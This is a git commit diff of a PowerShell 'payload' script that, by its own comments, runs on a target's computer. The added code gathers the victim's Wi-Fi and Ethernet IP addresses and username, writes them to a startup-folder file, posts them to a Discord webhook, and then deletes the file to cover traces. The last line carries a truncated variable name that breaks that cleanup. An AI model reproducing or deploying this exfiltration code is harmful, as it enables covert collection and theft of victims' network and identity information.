428dd7db2e60aadf7517a5700624f616e6384cc7
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-10-29 01:47:44 +0800

    Updated

--- Payload/DiscordPowershellDiscovery.ps1
+++ Payload/DiscordPowershellDiscovery.ps1
@@ -1,3 +1,15 @@
+# Get IPv4 address for WiFi adapter
+$WiFiAdapterName = "Wi-Fi"
+$WiFiIPv4 = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq $WiFiAdapterName -and $_.AddressFamily -eq "IPv4" }).IPAddress
+
+# Get IPv4 address for Ethernet adapter
+$EthernetAdapterName = "Ethernet"
+$EthernetIPv4 = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq $EthernetAdapterName -and $_.AddressFamily -eq "IPv4" }).IPAddress
+
+# Display the IPv4 addresses
+Write-Host "WiFi IPv4 Address: $WiFiIPv4"
+Write-Host "Ethernet IPv4 Address: $EthernetIPv4"
+
 # None of the files created will be saved on the target's computer
 # TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
 
@@ -16,7 +28,7 @@ $DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$Startup
 $DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile
 
 # Create a text file in the user's startup folder
-$TextContent = "$IPAddress`n$Username"
+$TextContent = "Wi-Fi IPv4 Address: $WiFiIPv4`nEthernet IPv4 Address: $EthernetIPv4`nUsername: $Username"
 $TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
 $TextContent | Out-File -FilePath $TextFile
 
@@ -42,4 +54,4 @@ $Headers = @{
 Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload
 
 # Delete the text file
-Remove-Item -Path $TextFile
+Remove-Item -Path $TextFil
